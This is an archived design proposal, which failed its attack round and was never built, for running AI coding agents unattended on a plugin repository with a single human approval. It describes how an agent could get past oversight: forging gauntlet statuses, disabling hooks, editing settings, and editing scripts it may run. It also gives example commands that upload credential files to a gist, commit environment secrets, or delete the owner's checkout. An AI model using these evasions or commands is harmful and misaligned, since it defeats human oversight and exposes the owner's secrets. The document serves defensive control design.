# Proposal under attack, version 2: agents do the work, a person only approves

> **Status (2026-11-12): failed its attack round, not built.** Version 2 of four designs for
> unattended runs on this repository, kept as a record. Its attack round returned 45 breaks,
> which were not kept as a file. The main ones: the allow list amounted to arbitrary execution
> (the agent edits a script it is allowed to run), the approval brief ran the pull request's
> code with the owner's privileges, and text gates stop only commands typed directly. Its section
> M9 (removing the Codex requirement) was not built from this file; a narrower change went in
> separately. Earlier design: `unattended-agents-human-out-proposal-2026-11-12.md`. Later
> designs: `unattended-jail-intake-bundle-proposal-2026-11-12.md` and
> `unattended-jail-branch-key-proposal-2026-11-12.md`.

Status: draft, nothing built, nothing edited. Repo: the checkout of `wasikarn/method-harness` (the `mh` Claude Code
plugin, GitHub `wasikarn/method-harness`, public, personal account, default branch `develop`).
This file is data for analysis. Statements in it are claims to test, not established truth.

Version 1 was attacked by four lanes and failed (about 30 distinct breaks). The owner then decided:
no CI, no fork flow; **a person stays as approver only**; anything not serious enough to need
approval is only reported to the person. Version 2 is built on that decision.

## The problem

The owner wants agents to do the work with a person involved as little as possible. Round 1 showed
that everything judging an agent's work (gauntlet, pass cache, git hooks, gate files, settings,
GitHub statuses) sits where the agent can write, so the person cannot be removed from the merge.
Version 2 keeps exactly one human act, approving a pull request, and tries to make that act (a)
enforced somewhere the agent cannot reach and (b) informed by facts the agent cannot forge.

## The change

### Principle

P1. Every outcome in `## Must stop` has at least one control **outside the agent's reach**: GitHub
branch protection, a separate OS user account, a credential that lacks a permission, or a limit set
at the model provider. mh's gates stay as a second layer against honest mistakes (the scope ADR
0005 already states), never as the only control.

P2. Three tiers, decided by fixed rules about **what is touched**, never by the agent's own opinion:
- **Never**: denied in the run. Nobody is asked.
- **Approve**: needs the owner. Unattended, the step is refused in the run and the question
  surfaces at pull-request time; the owner's PR approval is the single approval.
- **Notify**: done at once and reported. Only reversible actions belong here.

### Identities and machines

I1. Agents run under a **separate OS user** (`mhagent`) on the owner's machine, or on another
machine. That user has its own home directory, its own Claude Code login, its own mh install
enabled at user scope, its own clone of the repo, and no access to the owner's home (`~/.ssh`,
`~/.aws`, `~/.claude`, the owner's `gh` token).

I2. Agents use a **second GitHub account** (`mh-agent`), added to the repo as a collaborator with
write access (not admin). Its only credential on the agent OS user is a fine-grained personal
access token limited to this one repository with: Contents read/write, Pull requests read/write,
Metadata read. It has **no** Commit statuses permission, no Administration, no Gists.

I3. The owner account (`wasikarn`, admin) holds the only credential that can approve.

### GitHub settings (the enforced approval)

G1. Branch protection on `develop`: pull request required; `required_approving_review_count: 1`;
dismiss stale approvals when new commits are pushed; require approval of the most recent
reviewable push; required status check `mh/gauntlet`; force pushes and deletion disabled.

G2. `enforce_admins: false` (today it is true), so the owner can still merge the owner's own
pull requests, which nobody else can approve on a one-person repo. The agent account is not an
admin and is bound by G1.

G3. The agent never merges. The owner approves and merges (GitHub UI, mobile, or `gh` on the
owner's side). Auto-merge is not used.

### The owner's side: an approval brief the agent cannot forge

B1. New script `scripts/approval-brief.sh <PR>`, run **by the owner, as the owner's OS user, from
the owner's own checkout of `develop`**. It fetches the PR head into a clean temporary worktree and
reports, using the **base branch's copy** of every judging script (never the PR's copy):
- the full gauntlet result on the PR tree merged with current `develop`;
- every changed path under the judge set: `scripts/`, `git-hooks/`, `hooks/`, `tests/`, `evals/`,
  `.claude/`, `.claude-plugin/`, `skills/meta/harness-audit/`, `docs/METHODOLOGY.md`;
- assertions removed or tests skipped, computed from the diff with the logic of
  `hooks/gates/test-integrity.py`;
- credential-shaped strings in the diff, with the patterns of `hooks/gates/secret-scan.py`;
- whether the head still equals what was fetched.
On a green gauntlet it posts the `mh/gauntlet` status with the owner's token. The agent's token
cannot post statuses (I2), so that status now means "the owner's side ran the base judge".

B2. Whether the owner runs B1 by hand or from a deterministic timer on the owner's OS user (no
model involved; the repo's history already accepted a non-model cron) is the owner's choice. A PR
with no brief cannot merge for a non-admin, because the required status is missing.

B3. Version bump: the agent runs `scripts/sync-pr-head.sh` **before** asking for approval (it
syncs `develop`, cuts the version and pushes). Its status post fails harmlessly (no permission);
that failure is changed from fatal to a note. The owner approves that exact head. If `develop`
moves first, the agent re-syncs, the approval is dismissed (G1) and the owner approves again.
Accepted cost. `scripts/merge-pr.sh` stays for the owner's attended flow.

### Runtime

R1. Scheduler: agent-autoloop running as the agent OS user. Per rule: `access: "edit"`
(acceptEdits), `maxActive: 1` and `parallel` unset for this repo so **one run at a time** works in
the agent's single clone; `timeout` at its default 180 minutes; the scheduler's own retry limit
(10) and hop limit (8) stay. No second agent shares the tree, so the round-1 shared-worktree
breaks do not arise.

R2. Because acceptEdits in a `-p` run denies most Bash, the agent OS user's
`~/.claude/settings.json` carries a `permissions.allow` list for exactly what the flow needs:
`git add`, `git commit`, `git push origin claude/*`, `git fetch`, `git status|diff|log`,
`bash scripts/run-gauntlet.sh*`, `bash scripts/sync-pr-head.sh*`,
`bash skills/meta/harness-audit/scripts/audit.sh*`, `gh pr create*`, `gh pr comment*`,
`gh pr view*`, and the test runners. No bypassPermissions anywhere.

R3. The scheduler's `"program"` wrapper sets `MH_UNATTENDED=1` and execs `claude`. Optionally the
wrapper also runs inside `@anthropic-ai/sandbox-runtime`; version 2 does not depend on it, because
I1 and I2 carry the isolation.

R4. Spend limit: a budget cap set at the model provider on the agent's own API key or plan,
outside the agent's reach. The scheduler's usage figures (read from the run's stream output, not
from mh's Stop hook, which round 1 showed is killed in `-p`) are reported as Notify.

R5. Orca is not part of this proposal.

### Changes to mh

M1. **Tier wiring.** Gates keep "ask". Round 1 measured that a hook "ask" in a `-p` run is a
denial whose reason the model reads, at every permission mode, so unattended every "ask" already
lands in the Approve tier as "refused in the run". Changes:
- every "ask" reason, when `MH_UNATTENDED=1`, ends with: skip this step, continue with the rest,
  and list it under `## Needs owner` in the pull request;
- `test-integrity` only: when `MH_UNATTENDED=1` it allows and journals instead of asking, because
  ordinary test maintenance must proceed and the weakening is caught by B1 from the diff;
- attended sessions behave exactly as today.

M2. **Close holes that exist today:**
- `config-write-guard` also flags `disableAllHooks`, removal of `permissions.deny` / `ask`
  entries, and writes to the plugin cache and `installed_plugins.json`;
- `git-hooks/pre-commit` and `pre-push` scan staged and pushed content with `secret-scan.py`'s
  patterns (covers the Bash path that `secret-scan` as a Write/Edit hook cannot see);
- `scripts/_lib/gauntlet-pass.sh`: the pass cache is ignored when `MH_UNATTENDED=1`.

M3. **Reports (Notify tier).** The agent's pull request body carries `## What changed`,
`## Refused in this run` (from the gate journal for the session), `## Needs owner`, and the
verdict text of any review skill it ran. All of it is the agent's own account and is labelled as
such; the owner's decision rests on B1.

M4. **Review skills usable by an agent:** drop `disable-model-invocation` from `compliance-audit`
and `gate-report`; add the missing `contract_version` key to the output examples in
`skills/workflow/idea-audit/references/attacker-brief.md` and
`skills/review/compliance-audit/references/verifier-brief.md`.

M5. **Doctrine:** add one unattended clause to `docs/METHODOLOGY.md` (when nobody can answer, do
not wait: skip, continue, list under `## Needs owner`); rewrite the "No autonomous loop" line in
`docs/reference/operating-model.md` to "a scheduler may start a run; merging stays a person's
act". Rules 1, 3 and 14 otherwise stand.

M6. **Deletions, each with a reason and a complete file list:**
- `docs/decision-log.md` (no inbound reference; own kill date 2026-12-31);
- `PONYTAIL-DEBT.md` plus its entry in harness-audit check 70's allowlist;
- `scripts/_lib/gh-comment-bodies.sh` and `tests/scripts/test-gh-comment-bodies.sh`;
- the fragments feature **only if the owner confirms it is unused**: the three hook scripts and
  their four `hooks.json` and `hook-registry.json` entries, `scripts/_lib/fragments-state.sh`,
  `fragments_arm_parse.py`, `fragments_capture_parse.py`, `hook-common.sh`, the three
  `tests/hooks/test-fragments-*.sh`, `tests/scripts/test-hook-common.sh`, rows 41 to 42 of
  `scripts/gauntlet-rules.txt`, the three GLOSSARY terms, ADR 0003 set to deprecated.
  `scripts/_lib/slug-hash.sh` and `hook_payload.py` stay.

M7. **Not done** (withdrawn after round 1): converting ask to deny; removing any rule from
`irrecoverable.py`; removing `subagent-git-guard`; removing the merge `permissions.ask` rules;
letting any agent post a merge verdict that something trusts.

M8. **Process:** a new ADR supersedes ADR 0004 and records the exception to ADR 0005's gate
freeze for M1 and M2. One PR per item group; each must pass the audit and the gauntlet.

M9. **Remove the dependency on Codex and on any other AI vendor** (owner's instruction, given
while this version was being written; read here as "the project must no longer require or steer
to Codex or another vendor's model"). mh works with Claude Code alone:
- the four skills that use `codex exec` as their primary checker (`attack-proposal`,
  `compliance-audit`, `deep-audit`, `idea-audit`) use a fresh-context Claude agent as the only
  checker; their "independence reduced" fallback wording goes, and their confidence wording no
  longer depends on a second model family;
- delete: `hooks/gates/codex-setup-guard.{sh,py}` and its registration (ADR 0001 set to
  deprecated), `hooks/sensors/codex-quota-sensor.{sh,py}`, `hooks/sensors/codex-quota-advisory.{sh,py}`,
  `scripts/_lib/codex-resolve-model.py`, `scripts/_lib/codex-state-path.sh`, harness-audit checks
  71 and 72 and the `codex:` namespace in check 80, `docs/reference/codex-integration-map.md`,
  the Codex paragraphs in `docs/reference/spawn-brief.md` and `docs/METHODOLOGY.md` Rule 13, the
  Codex terms in `GLOSSARY.md`, the Codex pointer in `AGENTS.md`, and their tests
  (`tests/hooks/test-codex-quota.sh`, `tests/hooks/test-codex-setup-guard.sh`,
  `tests/scripts/test-codex-resolve-model.sh`);
- update every count and list that names them: `hooks/hooks.json`, `hooks/hook-registry.json`,
  the gate-count phrase in `.claude-plugin/plugin.json` and `marketplace.json`, the README gate
  table, `scripts/gauntlet-rules.txt`, `audit.sh`'s expected check ids, the fixtures of the
  removed checks, and eval cases or graders that expect a Codex dispatch;
- `scripts/_lib/slug-hash.sh` may be deleted only if both this item and the fragments deletion
  (M6) land, since those are its two consumers.
Known cost, stated: the repo's own history records cross-family review as "the primary
mitigation" for same-model blind spots, and that a three-Claude panel is worth about 1.3 to 1.5
votes. Version 2 accepts this because a reviewer's verdict is Notify only (M3) and the owner's
decision rests on B1's deterministic brief.

## Must stop

- An agent's work reaches `develop` without the owner approving that exact content. Example: the
  agent account calls the merge API, or pushes one more commit after the approval.
- The owner approves on false information. Example: the PR replaces `scripts/run-gauntlet.sh` with
  `exit 0`, or deletes an assertion, and the report still says green.
- An agent reads or sends out the owner's credentials. Example: `gh gist create ~/.aws/credentials`.
- An agent damages anything outside its own clone, or another party's work. Example:
  `rm -rf` on the owner's checkout, a force push to `develop` or to a branch it does not own.
- A secret lands in pushed history of this public repo. Example: `env > debug.log` then commit
  and push.
- A run hangs or spends without limit.
- A change in this proposal locks the repo (no commit can pass pre-commit) or removes the only
  control on some path.

## Must allow

- With nobody present, the agent takes a task, edits, runs the tests and the gauntlet, commits,
  pushes `claude/<slug>`, opens a pull request with its report, runs `sync-pr-head.sh`, and stops.
- The owner approves and merges with one deliberate act, after reading the brief.
- Ordinary test maintenance in an unattended run (renaming a variable inside an assertion,
  deleting an obsolete assertion).
- The owner's attended sessions work exactly as today, including the owner's own PRs and
  `scripts/merge-pr.sh`.
- The existing gauntlet and harness-audit pass after each PR of this change.
- mh still installs and enforces in a Claude Code cloud session via `scripts/cloud-setup.sh`.

## Known facts

Verified in round 1 (re-check freely):

- K1. In a `-p` run a PreToolUse hook's "ask" is a denial and the model reads the reason, at
  `--permission-mode bypassPermissions` too (live probe, claude 2.1.322). Interactive bypass was
  not probed.
- K2. An async Stop hook is killed at teardown in a `-p` run (docs and live probe), so
  `hooks/stop/cost-tracker.sh` rows are usually lost unattended.
- K3. GitHub: "Any person or integration with write permissions to a repository can set the state
  of any status check"; restricting who can push and bypass lists exist only for organization
  repositories.
- K4. `scripts/merge-pr.sh` and `scripts/sync-pr-head.sh` run the checkout's own
  `scripts/run-gauntlet.sh`; the pass cache is any file named by the tree hash under
  `$HOME/.cache/mh/gauntlet-pass` or `$GAUNTLET_PASS_DIR`.
- K5. `secret-scan` and `config-write-guard` match only Write and Edit; `config-write-guard`
  compares only `hooks`, `enabledPlugins`, `env`; the git hooks do no secret scanning.
- K6. autoloop's worker copies the environment to the child except `AGENT_AUTOLOOP_*`,
  `CLAUDECODE`, `CLAUDE_CODE_*`, `CODEX_*`; it passes no `--setting-sources` and no
  `--allowedTools`; the rule fields `maxActive`, `parallel`, `timeout`, `program` exist in its
  manual.
- K7. `test-integrity` asks on any removed assertion line, including pure renames.
- K8. `scripts/_lib/slug-hash.sh` is sourced by `codex-state-path.sh`, which harness-audit sources.
- K9. harness-audit check 74 names four gate files; check 73 requires `hooks.json` and
  `hook-registry.json` to agree; check 11 is CRIT on an unwired hook file; check 79 pins counts.
- K10. The local checkout is shallow; about 1,480 commits after the frozen changelog are only in
  full history.

**Unverified. These are the first targets:**

- V1. On a public repository owned by a personal account, a collaborator with write access is
  bound by `required_approving_review_count: 1`, cannot approve its own pull request, and cannot
  merge without the owner's approval; "dismiss stale approvals" and "require approval of the most
  recent reviewable push" are available there; with `enforce_admins: false` the owner can merge
  the owner's own PR without another approval.
- V2. A fine-grained token with Contents and Pull requests write but without Commit statuses
  cannot create a commit status, cannot create a gist, cannot change branch protection, and
  cannot approve as another user. And whether a collaborator (not the repo owner) can create a
  fine-grained token for a repository it does not own.
- V3. `permissions.allow` rules in user settings let the listed Bash commands run in a `-p` run
  under acceptEdits, and a pattern such as `Bash(git push origin claude/*)` cannot be stretched
  to another command by chaining (`&&`, `;`, substitution).
- V4. The model cannot change the environment the hooks see (`MH_UNATTENDED`) from inside a run.
- V5. A separate OS user gives the isolation I1 claims on macOS and Linux for a default home
  directory, and autoloop can run as that user and still deliver cards to the owner.
- V6. `scripts/approval-brief.sh` can be built so the PR's code never executes with the owner's
  privileges in a way that matters: the gauntlet **runs the PR's tests and scripts**, as the
  owner's OS user.
- V7. `sync-pr-head.sh` can be changed so a failed status post is not fatal without weakening the
  owner's attended flow.
- V8. The scheduler's `maxActive: 1` and `timeout` behave as its manual says.
- V9. Nothing else in the repo needs `enforce_admins: true`.
- V10. M9's file list is complete: nothing else in the repo sources, runs, counts or tests a
  Codex surface, and the audit and gauntlet pass once the listed files change together.
- V11. With Codex removed, the four review skills still produce a checkable verdict: their
  checker scripts (`check-verdict.py`, `verdict_json.py`) do not assume `--output-schema` or a
  Codex-only output shape.

## Round 1 breaks and how version 2 claims to answer each

Treat each "answer" as a claim to break.

| Round 1 break | Version 2 answer |
|---|---|
| Author posts its own MERGE verdict and merges | No verdict is trusted; merge needs the owner's approval (G1), agent is non-admin |
| Agent posts `mh/gauntlet` itself by curl | Agent token lacks Commit statuses (I2); status comes from the owner's side (B1) |
| Merge by MCP tool or curl | Refused by GitHub without an approval (G1) |
| PR replaces `run-gauntlet.sh` or weakens tests | B1 runs the base branch's judge and lists judge-path changes and removed assertions |
| Forged pass cache, forged replay record, `--skip-replay` | Agent-side results are not trusted; B1 recomputes; the agent does not run `merge-pr.sh` |
| Author's later MERGE overrides a reviewer's FIX FIRST | Verdict comments are Notify only |
| `disableAllHooks`, plugin-cache overwrite, `claude --bare`, `sed` on settings | Agent can only switch off its own second layer; P1 controls are outside its reach (G1, I1, I2); M2 closes the Write/Edit shapes |
| Write a script then run it; `shutil.rmtree` | Damage is confined by I1 (own home and clone) and I2 (own token); protected branch by G1 |
| `gh gist create ~/.aws/credentials` | Owner's files are not readable (I1); token has no Gists permission (I2) |
| Secret committed through Bash | M2 adds scanning to the git hooks; B1 scans the diff before merge |
| Peers' worktrees destroyed; shared `.git` reflog | One run at a time in a dedicated clone (R1); class A rules stay (M7) |
| Lock broken across PID namespaces; `$HOME/.cache/mh` unwritable in a sandbox | Sandbox is optional (R3); one run at a time; agent does not run `merge-pr.sh` |
| `edit` mode cannot commit or push | `permissions.allow` list (R2) |
| ask to deny harms attended sessions; test-integrity dilemma | ask stays; `test-integrity` allows only when `MH_UNATTENDED=1`, B1 reports weakening |
| `secret-scan` deny teaches the `gitleaks:allow` marker | Unchanged gate; B1 reports marked lines in the diff as well |
| Deleting `slug-hash.sh` locks the repo; incomplete file lists | M6 keeps it and lists files |
| Spend halt blind to hung runs; timeout kills a healthy merge | Provider-side budget cap (R4); scheduler timeout 180 min; agent does not run `merge-pr.sh` |
| Fan-out and retry loops | `maxActive: 1`, scheduler retry and hop limits (R1); nested `claude` spawn rule stays for subagents; top-level spawn remains possible |
| Attended and unattended from one build | `MH_UNATTENDED` set by the wrapper is the only switch (M1) |
